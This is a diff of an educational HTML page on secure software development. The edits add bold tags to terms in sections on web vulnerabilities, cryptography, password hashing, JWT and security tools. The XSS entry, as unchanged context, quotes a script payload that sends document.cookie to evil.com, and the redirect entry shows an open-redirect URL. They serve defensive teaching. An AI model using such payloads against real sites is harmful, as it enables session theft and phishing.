-            <div class="key-term-item"><strong>🔓 Broken Authentication and Session Management</strong><span><strong>Vulnerability:</strong> Weak passwords accepted, no account lockout on repeated failures, session tokens not invalidated on logout, or passwords stored in plaintext. An attacker can brute-force passwords, steal session cookies via XSS, or use credential-stuffing attacks with leaked databases. <strong>Prevention:</strong> Enforce minimum password complexity; implement bcrypt hashing with salt; lock accounts after 5 failed attempts; use <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code> session cookies; invalidate server-side session on logout; implement MFA for sensitive operations.</span></div>
+            <div class="key-term-item"><strong>🔓 Broken Authentication and Session Management</strong><span><strong>Vulnerability:</strong> Weak passwords accepted, no account lockout on repeated failures, session tokens not invalidated on logout, or passwords stored in plaintext. An attacker can brute-force passwords, steal session cookies via <strong>XSS</strong>, or use credential-stuffing attacks with leaked databases. <strong>Prevention:</strong> Enforce minimum password complexity; implement bcrypt hashing with salt; lock accounts after 5 failed attempts; use <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code> session cookies; invalidate server-side session on logout; implement MFA for sensitive operations.</span></div>
             <div class="key-term-item"><strong>💉 Cross-Site Scripting (XSS)</strong><span><strong>Vulnerability:</strong> An attacker injects malicious JavaScript into a page served to other users — for example, submitting <code>&lt;script&gt;document.location='https://evil.com/?c='+document.cookie&lt;/script&gt;</code> as a comment. When other users view the page, the script executes in their browser, stealing their session cookies or performing actions on their behalf. <strong>Prevention:</strong> HTML-encode all user-supplied content before rendering it (convert <code>&lt;</code> to <code>&amp;lt;</code>); implement Content Security Policy (CSP) headers that forbid inline scripts; use modern frameworks (React, Vue) that automatically escape dynamic content.</span></div>
             <div class="key-term-item"><strong>🔀 Cross-Site Request Forgery (CSRF)</strong><span><strong>Vulnerability:</strong> A malicious website tricks an authenticated user's browser into submitting an unwanted request to another site where the user is logged in. For example, a hidden image tag on a malicious page makes the user's browser silently send a bank transfer request — the bank sees a valid session cookie and processes the transfer. <strong>Prevention:</strong> Issue a unique, unpredictable anti-CSRF token with every state-changing form; validate the token server-side before processing. Use <code>SameSite=Strict</code> cookies to block cross-origin requests from sending cookies at all.</span></div>
             <div class="key-term-item"><strong>↩️ Invalid Forwarding and Redirecting</strong><span><strong>Vulnerability:</strong> An application redirects users to a URL provided as a parameter — e.g., <code>/login?next=https://evil.com</code>. After login, the application blindly redirects to the attacker's site. The user, trusting that they authenticated on the real site, does not notice the redirect — a phishing vector. <strong>Prevention:</strong> Never use user-supplied URLs as redirect targets without validation. Maintain a strict allowlist of permitted redirect destinations and reject anything not on the list. Prefer internal relative paths (e.g., <code>/dashboard</code>) over absolute URLs for post-login redirects.</span></div>
@@ -961,7 +963,7 @@ print(encode_output(<span class="str">"&lt;script&gt;alert('xss')&lt;/script&gt;
           </div>
 
           <h3>Protection Against Side Channel Attacks</h3>
-          <p><strong>Side channel attacks</strong> exploit information inadvertently leaked through the physical implementation of a system — such as power consumption, electromagnetic emissions, execution timing, or cache access patterns — rather than flaws in the algorithm itself. The attacker does not break the cryptographic algorithm; they observe the system's physical behaviour while it executes to infer secret values.</p>
+          <p><strong>Side channel attacks</strong> exploit information inadvertently leaked through the physical implementation of a system — such as power consumption, electromagnetic emissions, execution timing, or cache access patterns — rather than flaws in the <strong>algorithm</strong> itself. The attacker does not break the cryptographic <strong>algorithm</strong>; they observe the system's physical behaviour while it executes to infer secret values.</p>
 
           <div class="info-grid">
             <div class="info-card">
@@ -994,10 +996,10 @@ print(encode_output(<span class="str">"&lt;script&gt;alert('xss')&lt;/script&gt;
           <p class="syllabus-concept">📌 <em><strong>Apply and describe</strong> the benefits of collaboration to develop safe and secure software, including considering various points of view, delegating tasks based on expertise, and improving the quality of the solution.</em></p>
 
           <h3>Considering Various Points of View</h3>
-          <p>Security vulnerabilities often arise from blind spots — assumptions that every developer on a team unconsciously shares. Diverse, collaborative teams with members of different backgrounds, experience levels, and technical specialisations surface these blind spots before attackers do. A junior developer may question why a legacy authentication flow uses MD5 hashing (now cryptographically broken), sparking a critical security review that a senior team that has always used it might never initiate. UX designers identify where security mechanisms create friction that users will bypass. Quality assurance engineers approach the system adversarially — trying to break it — revealing edge cases that developers, focused on making features work, did not consider. Security engineers trained in offensive techniques think like attackers, anticipating exploitation paths that application developers are not trained to see. Collaboration across these different perspectives produces a more comprehensively reviewed, higher-confidence security posture than any single expert could achieve alone.</p>
+          <p>Security vulnerabilities often arise from blind spots — assumptions that every developer on a team unconsciously shares. Diverse, collaborative teams with members of different backgrounds, experience levels, and technical specialisations surface these blind spots before attackers do. A junior developer may question why a legacy <strong>authentication</strong> flow uses MD5 hashing (now cryptographically broken), sparking a critical security review that a senior team that has always used it might never initiate. UX designers identify where security mechanisms create friction that users will bypass. Quality assurance engineers approach the system adversarially — trying to break it — revealing edge cases that developers, focused on making features work, did not consider. Security engineers trained in offensive techniques think like attackers, anticipating exploitation paths that application developers are not trained to see. Collaboration across these different perspectives produces a more comprehensively reviewed, higher-confidence security posture than any single expert could achieve alone.</p>
 
           <h3>Delegating Tasks Based on Expertise</h3>
-          <p>Secure software development encompasses highly specialised domains that no single developer can master completely. Effective teams delegate responsibilities to members with the specific expertise required. Cryptography implementations (key management, protocol selection, algorithm configuration) are assigned to engineers with dedicated security training — an incorrectly implemented cryptographic protocol may appear to work correctly while providing no actual security. Front-end developers focus on output encoding, Content Security Policy configuration, and XSS prevention in the client-side code they know deeply. Database administrators design the access control and auditing configuration of database servers according to their specialised knowledge of the database engine. Network engineers configure firewalls, TLS termination, and intrusion detection systems. This deliberate delegation ensures each security domain receives the depth of expertise it requires, rather than being shallowly addressed by generalists stretched across every area simultaneously.</p>
+          <p>Secure software development encompasses highly specialised domains that no single developer can master completely. Effective teams delegate responsibilities to members with the specific expertise required. Cryptography implementations (key management, protocol selection, <strong>algorithm</strong> configuration) are assigned to engineers with dedicated security training — an incorrectly implemented cryptographic protocol may appear to work correctly while providing no actual security. Front-end developers focus on output encoding, Content Security Policy configuration, and <strong>XSS</strong> prevention in the client-side code they know deeply. Database administrators design the access control and auditing configuration of database servers according to their specialised knowledge of the database engine. Network engineers configure firewalls, <strong>TLS</strong> termination, and intrusion detection systems. This deliberate delegation ensures each security domain receives the depth of expertise it requires, rather than being shallowly addressed by generalists stretched across every area simultaneously.</p>
 
           <h3>Quality of the Solution</h3>
           <p>Collaborative security practices — particularly peer code review and pair programming — produce measurably higher quality, more secure code than individual development. Peer code review is the single most cost-effective defect removal technique in software engineering: catching a vulnerability during code review costs a fraction of fixing it after deployment. When two developers review each other's security-critical code, logical errors, missing edge case handling, and subtle vulnerability patterns that the original author's familiarity blinds them to are caught before they ship. Collaboration also produces better documentation of security decisions — why a particular implementation was chosen over alternatives — reducing the risk that future maintainers unknowingly introduce vulnerabilities by changing security controls they do not understand the purpose of. Teams that practice collaborative security review consistently produce software with fewer critical vulnerabilities reaching production.</p>
@@ -1018,13 +1020,13 @@ print(encode_output(<span class="str">"&lt;script&gt;alert('xss')&lt;/script&gt;
           <p>Enterprises that develop a culture of secure software engineering accumulate codified security knowledge — documented threat models, established security patterns, reusable security libraries, and tested compliance frameworks — that directly accelerates and improves the security of every subsequent product. The first product built with security by design takes significant investment to establish the patterns; the second product is built on top of proven, battle-tested security infrastructure. Over time, the enterprise develops internal expertise and reputation that attracts security-conscious talent and positions the organisation to participate in industry standards development (e.g., contributing to OWASP, Australian Cyber Security Centre guidance, or NIST frameworks), further enhancing reputation and influence. Security-mature organisations are also better positioned to respond to and shape evolving regulatory requirements — rather than scrambling to comply at the last moment.</p>
 
           <h3>Improved Work Practices</h3>
-          <p>The implementation of DevSecOps — integrating security into every stage of the development pipeline — transforms security from a gating checkpoint at the end of the development cycle into a continuous quality feedback mechanism throughout it. Automated SAST scanning in CI/CD pipelines means developers receive security feedback within minutes of committing code, while the context of what they wrote is still fresh in mind — making remediation fast and educational. Security champions programs embed security expertise within development teams rather than siloing it in a separate security department, improving security knowledge across the entire engineering organisation. These practices systematically reduce the volume of security debt accumulated over time, resulting in a healthier, more maintainable codebase that is faster and cheaper to extend.</p>
+          <p>The implementation of DevSecOps — integrating security into every stage of the development pipeline — transforms security from a gating checkpoint at the end of the development cycle into a continuous quality feedback mechanism throughout it. Automated SAST scanning in <strong>CI/CD</strong> pipelines means developers receive security feedback within minutes of committing code, while the context of what they wrote is still fresh in mind — making remediation fast and educational. Security champions programs embed security expertise within development teams rather than siloing it in a separate security department, improving security knowledge across the entire engineering organisation. These practices systematically reduce the volume of security debt accumulated over time, resulting in a healthier, more maintainable codebase that is faster and cheaper to extend.</p>
 
           <h3>Productivity</h3>
           <p>Counter-intuitively, building security in from the start dramatically improves long-term development productivity. The cost of fixing a security vulnerability increases by an order of magnitude at each stage of development: a vulnerability identified by a developer during coding takes minutes to fix; the same vulnerability caught in code review takes hours; caught in testing takes days (including regression testing); caught in production requires an emergency patch, incident response, possible customer notification, regulatory reporting, and forensic investigation — potentially weeks of disrupted work. Teams that invest in shift-left security (catching vulnerabilities earlier in the development cycle) spend a fraction of the total time on security compared to teams that rely on reactive patching. Additionally, a stable, low-incident production environment means developers spend time building new features rather than responding to security emergencies.</p>
 
           <h3>Business Interactivity</h3>
-          <p>Modern enterprises operate through an ecosystem of interconnected systems — sharing data with partners, customers, suppliers, and regulators through APIs and integrations. Secure API design (with authentication, authorisation scopes, input validation, rate limiting, and encryption) enables this business interactivity without exposing corporate systems to the security risks inherent in external connections. An enterprise with a strong security posture can participate in data-sharing partnerships that competitors with weaker security practices are excluded from — particularly in regulated industries such as healthcare (requiring compliance with Australian Digital Health Agency standards), financial services (PCI-DSS, APRA CPS 234), and government contracting (IRAP assessments). Conversely, a publicised breach or regulatory sanction can immediately disqualify an organisation from business-critical partnerships, with devastating commercial consequences.</p>
+          <p>Modern enterprises operate through an ecosystem of interconnected systems — sharing data with partners, customers, suppliers, and regulators through APIs and integrations. Secure API design (with <strong>authentication</strong>, <strong>authorisation</strong> scopes, input validation, rate limiting, and <strong>encryption</strong>) enables this business interactivity without exposing corporate systems to the security risks inherent in external connections. An enterprise with a strong security posture can participate in data-sharing partnerships that competitors with weaker security practices are excluded from — particularly in regulated industries such as healthcare (requiring compliance with Australian Digital Health Agency standards), financial services (PCI-DSS, APRA CPS 234), and government contracting (IRAP assessments). Conversely, a publicised breach or regulatory sanction can immediately disqualify an organisation from business-critical partnerships, with devastating commercial consequences.</p>
         </section>
 
         <hr class="divider" />
@@ -1048,7 +1050,7 @@ print(encode_output(<span class="str">"&lt;script&gt;alert('xss')&lt;/script&gt;
           <p>Software is protected by copyright from the moment it is created, without requiring registration. Copyright protects the specific expression of code (the actual written source code) — not the underlying idea or functionality. Enterprises must ensure they do not incorporate third-party code without the appropriate licence. Using open-source libraries requires understanding and complying with their respective licences: MIT and Apache 2.0 allow use in proprietary software with attribution; GPL-licensed code requires any derivative work to also be open source — a requirement that can force an enterprise to open-source its proprietary codebase if GPL code is incorporated without understanding this obligation. AI-generated code introduces novel copyright questions that are not yet fully resolved in Australian law — the source of training data and the originality of generated output are active areas of legal debate with significant implications for enterprise software development.</p>
 
           <h3>Intellectual Property</h3>
-          <p>Proprietary software algorithms, architectures, and business logic represent significant intellectual property (IP) assets that secure software design must protect from theft and unauthorised disclosure. Trade secrets (unpatented technical approaches that derive value from their secrecy) are protected under common law and the <em>Corporations Act 2001</em>, but only if the enterprise takes reasonable steps to maintain their secrecy — which requires technical security measures (code obfuscation, server-side execution of sensitive logic, access controls, NDAs with employees and contractors) and legal protections. A security breach that exposes proprietary source code, training data for ML models, or unique business algorithms can destroy the commercial value of years of R&amp;D investment. Additionally, engineers must ensure the software they develop does not unintentionally incorporate competitors' IP through reverse engineering — a legally and ethically fraught practice with significant liability exposure.</p>
+          <p>Proprietary software <strong>algorithms</strong>, architectures, and business logic represent significant intellectual property (IP) assets that secure software design must protect from theft and unauthorised disclosure. Trade secrets (unpatented technical approaches that derive value from their secrecy) are protected under common law and the <em>Corporations Act 2001</em>, but only if the enterprise takes reasonable steps to maintain their secrecy — which requires technical security measures (code obfuscation, server-side execution of sensitive logic, access controls, NDAs with employees and contractors) and legal protections. A security breach that exposes proprietary source code, training data for ML models, or unique business <strong>algorithms</strong> can destroy the commercial value of years of R&amp;D investment. Additionally, engineers must ensure the software they develop does not unintentionally incorporate competitors' IP through reverse engineering — a legally and ethically fraught practice with significant liability exposure.</p>
 
           <h3>Digital Disruption</h3>
           <p>Highly secure, scalable digital platforms are a primary vehicle of digital disruption — displacing established industries by offering superior trust, convenience, and cost efficiency built on robust technical infrastructure. The disruption is bidirectional: secure fintech platforms (such as Afterpay, Revolut, and digital-only banks) disrupt traditional banking by offering comparable or superior financial services without physical branch infrastructure; conversely, a high-profile security failure by a disruptive digital entrant (such as a cryptocurrency exchange breach) can instantly restore consumer confidence in the incumbent institution it was displacing. For established enterprises, failing to invest in secure digital infrastructure creates vulnerability to disruption by more security-mature competitors — customers increasingly make choices based on perceived trustworthiness of digital platforms. The social dimension of digital disruption includes: geographic communities losing economic activity as digital services replace local businesses; skill displacement as digital processes automate roles that provided employment pathways; and concentration of market power in digital platform operators whose security and privacy practices affect vast user populations with limited alternatives.</p>
@@ -1068,7 +1070,7 @@ print(encode_output(<span class="str">"&lt;script&gt;alert('xss')&lt;/script&gt;
           <div class="info-grid">
             <div class="info-card">
               <h4>AES (Advanced Encryption Standard)</h4>
-              <p>The gold standard for symmetric encryption. Block cipher operating on 128-bit blocks. Key sizes: 128, 192, or 256 bits. AES-256 is essentially unbreakable with current technology. Used by governments, banks, and SSL/TLS. AES-GCM mode also provides authentication (detects tampering).</p>
+              <p>The gold standard for symmetric <strong>encryption</strong>. Block cipher operating on 128-bit blocks. Key sizes: 128, 192, or 256 bits. AES-256 is essentially unbreakable with current technology. Used by governments, banks, and SSL/<strong>TLS</strong>. AES-GCM mode also provides <strong>authentication</strong> (detects tampering).</p>
             </div>
           </div>
 
@@ -1104,16 +1106,16 @@ print(f"Decrypted: {recovered.decode()}")</code></pre>
                 <tr><td>Keys</td><td>One shared key</td><td>Public + private key pair</td></tr>
                 <tr><td>Speed</td><td>Fast — suitable for bulk data</td><td>Slow — only used for small data</td></tr>
                 <tr><td>Key distribution problem</td><td>How do you share the key securely?</td><td>Solved — public key can be shared openly</td></tr>
-                <tr><td>Use cases</td><td>File encryption, disk encryption, AES in TLS</td><td>Key exchange, digital signatures, SSL handshake</td></tr>
+                <tr><td>Use cases</td><td>File <strong>encryption</strong>, disk <strong>encryption</strong>, AES in <strong>TLS</strong></td><td>Key exchange, digital signatures, SSL handshake</td></tr>
               </tbody>
             </table>
           </div>
 
           <h3>Password Hashing</h3>
-          <p><strong>Hashing</strong> is a one-way transformation — you cannot reverse a hash to get the original data. Never store passwords in plaintext or with simple hashing (MD5/SHA-1 are broken for passwords). Always use a purpose-built password hashing algorithm that includes salting and is deliberately slow.</p>
+          <p><strong>Hashing</strong> is a one-way transformation — you cannot reverse a hash to get the original data. Never store passwords in plaintext or with simple hashing (MD5/SHA-1 are broken for passwords). Always use a purpose-built password hashing <strong>algorithm</strong> that includes salting and is deliberately slow.</p>
 
           <div class="callout danger">
-            <strong>Never use MD5 or SHA-1 for passwords.</strong> These are fast hashing algorithms — an attacker can test billions of guesses per second on modern GPUs. Use bcrypt, scrypt, or Argon2 which are deliberately slow and include a salt to prevent rainbow table attacks.
+            <strong>Never use MD5 or SHA-1 for passwords.</strong> These are fast hashing <strong>algorithms</strong> — an attacker can test billions of guesses per second on modern GPUs. Use bcrypt, scrypt, or Argon2 which are deliberately slow and include a salt to prevent rainbow table attacks.
           </div>
 
           <div class="code-block">
@@ -1156,7 +1158,7 @@ print(check_login("WrongPassword", hashed))  # False</code></pre>
           </div>
 
           <h3>JWT (JSON Web Tokens)</h3>
-          <p>A JWT is a compact, URL-safe token consisting of three Base64-encoded parts separated by dots: <code>Header.Payload.Signature</code>. The server signs the token with a secret key — any tampering with the payload invalidates the signature.</p>
+          <p>A <strong>JWT</strong> is a compact, URL-safe token consisting of three Base64-encoded parts separated by dots: <code>Header.Payload.Signature</code>. The server signs the token with a secret key — any tampering with the payload invalidates the signature.</p>
           <pre class="text-diagram">JWT Authentication Flow
 ────────────────────────────────────────────────────
 1. User sends POST /login with {username, password}
@@ -1171,7 +1173,7 @@ print(check_login("WrongPassword", hashed))  # False</code></pre>
 ────────────────────────────────────────────────────</pre>
 
           <div class="code-block">
-            <div class="code-header"><span class="code-lang">Python — JWT encode and decode (PyJWT)</span></div>
+            <div class="code-header"><span class="code-lang">Python — <strong>JWT</strong> encode and decode (PyJWT)</span></div>
             <pre><code>import jwt
 from datetime import datetime, timedelta, timezone
 
@@ -1220,10 +1222,10 @@ print(verify_token(token))
                 <tr><th>Tool</th><th>Type</th><th>What It Finds</th><th>Cost</th></tr>
               </thead>
               <tbody>
-                <tr><td><strong>bandit</strong></td><td>Python static analysis</td><td>Hardcoded passwords, SQL injection, use of unsafe functions (<code>eval</code>, <code>pickle</code>), insecure random</td><td>Free</td></tr>
+                <tr><td><strong>bandit</strong></td><td>Python static analysis</td><td>Hardcoded passwords, <strong>SQL injection</strong>, use of unsafe functions (<code>eval</code>, <code>pickle</code>), insecure random</td><td>Free</td></tr>
                 <tr><td><strong>safety</strong></td><td>Dependency checker</td><td>Python packages with known CVEs (Common Vulnerabilities and Exposures)</td><td>Free (basic)</td></tr>
-                <tr><td><strong>OWASP ZAP</strong></td><td>Web app scanner</td><td>XSS, SQL injection, CSRF, missing headers, insecure cookies</td><td>Free</td></tr>
-                <tr><td><strong>Burp Suite</strong></td><td>Intercepting proxy</td><td>Manual testing: inspect/modify HTTP requests, replay attacks, fuzzing</td><td>Free (Community)</td></tr>
+                <tr><td><strong>OWASP ZAP</strong></td><td>Web app scanner</td><td><strong>XSS</strong>, <strong>SQL injection</strong>, CSRF, missing headers, insecure cookies</td><td>Free</td></tr>
+                <tr><td><strong>Burp Suite</strong></td><td>Intercepting proxy</td><td>Manual testing: inspect/modify <strong>HTTP</strong> requests, replay attacks, fuzzing</td><td>Free (Community)</td></tr>
               </tbody>
             </table>
           </div>
